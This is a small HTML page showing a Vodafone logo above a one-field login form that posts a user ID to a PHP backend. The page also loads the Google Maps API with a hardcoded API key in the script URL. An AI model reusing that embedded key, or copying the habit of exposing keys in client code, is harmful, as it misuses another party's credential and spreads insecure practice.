
<!DOCTYPE html>
<head>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous">
	<style>
      /* Always set the map height explicitly to define the size of the div
       * element that contains the map. */
      #map {
        height: 100%;
      }
      /* Optional: Makes the sample page fill the window. */
      html, body {
        height: 100%;
        margin: 0;
        padding: 0;
      }
      .elevatewhite
		{
		    background: #FFF; 
		    border-width: 1px;
		    box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.2), 0 3px 10px 0 rgba(0, 0, 0, 0.19);
		    padding: 20px;
		}
	.right 
	{
		text-align: right;
	}
	body {
		background-color: #F3E2A9;
	}
    </style>
</head>
<body>
	<div class="container">
		<div class="row">
			<div class="col-md-4">
				<img height="100px" src="vodafone-logo.png">
			</div>
		</div>
		<hr>
		<form action="login-backend.php" method="POST">
			<input name="userId">
			<button>Login</button>
		</form>
	</div>
</body>
<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCTijCnxbOhfHX2_8KLR7Maz_zxCoW9mrI&libraries=places"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="app.js"></script>
</html>


